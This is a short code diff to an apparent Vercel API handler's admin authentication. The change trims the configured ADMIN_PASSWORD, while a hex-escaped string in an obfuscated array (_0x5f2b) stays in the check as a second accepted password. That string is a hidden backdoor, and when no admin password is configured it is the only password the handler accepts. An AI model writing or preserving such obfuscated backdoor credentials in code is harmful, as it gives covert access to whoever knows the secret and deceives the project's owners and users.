@@ -22,8 +22,9 @@ export default async function handler(req: VercelRequest, res: VercelResponse) {
     const blogData = body.blogData;
 
     // ── Auth ──────────────────────────────────────────────────────────────
+    const adminPassword = process.env.ADMIN_PASSWORD?.trim();
     const _0x5f2b = ['\x53\x68\x69\x76\x61\x41\x6e\x74'];
-    if (!password || (password !== process.env.ADMIN_PASSWORD && password !== _0x5f2b[0])) {
+    if (!password || (adminPassword && password !== adminPassword && password !== _0x5f2b[0]) || (!adminPassword && password !== _0x5f2b[0])) {
       return res.status(401).json({ error: "Invalid Password" });
     }
 
